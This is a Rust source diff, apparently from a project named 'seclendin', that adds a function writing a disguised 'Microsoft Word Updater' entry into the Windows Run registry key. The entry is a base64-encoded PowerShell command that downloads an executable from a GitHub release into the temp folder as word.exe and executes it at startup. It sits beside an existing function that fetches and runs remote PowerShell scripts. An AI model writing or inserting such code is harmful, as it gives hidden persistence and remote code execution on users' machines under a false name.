@@ -1,11 +1,35 @@
 use anyhow::{Context, Result};
+use base64::encode;
 use reqwest::Client;
 use std::fs::File;
 use std::io::copy;
 use std::path::Path;
 use std::path::PathBuf;
+use std::process::Command;
 use std::process::Stdio;
-use tokio::process::Command;
+use winreg::enums::*;
+use winreg::RegKey;
+
+pub fn add_startup_command() {
+    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    let (key, _disp) = hkcu.create_subkey(path).expect("Key couldnt created");
+    let a = "$TempPath = [System.IO.Path]::GetTempPath();";
+    let b = "$FilePath = \"$TempPath\\word.exe\";";
+    let release_tag = env!("RELEASE_TAG");
+    let c = format!(
+        "$Uri = \"https://github.com/skylab-kulubu/seclendin/releases/download/{}/seclendin.exe\";",
+        release_tag
+    );
+    let d = "iwr -Uri $Uri -OutFile $FilePath;";
+    let e = "iex $FilePath";
+    let payload = format!("{}{}{}{}{}", a, b, c, d, e);
+    let encoded_payload = encode(payload);
+
+    let powershell_command = format!("powershell -e {}", encoded_payload);
+    key.set_value("Microsoft Word Updater", &powershell_command)
+        .expect("An error occured while setting the value");
+}
 
 pub async fn fetch_and_execute_powershell_script(
     url: &String,
@@ -36,7 +60,7 @@ pub async fn fetch_and_execute_powershell_script(
     cmd.stderr(Stdio::piped());
 
     // Execute and handle output
-    let output = cmd.output().await?;
+    let output = cmd.output().unwrap();
 
     if !output.stdout.is_empty() {
         println!(
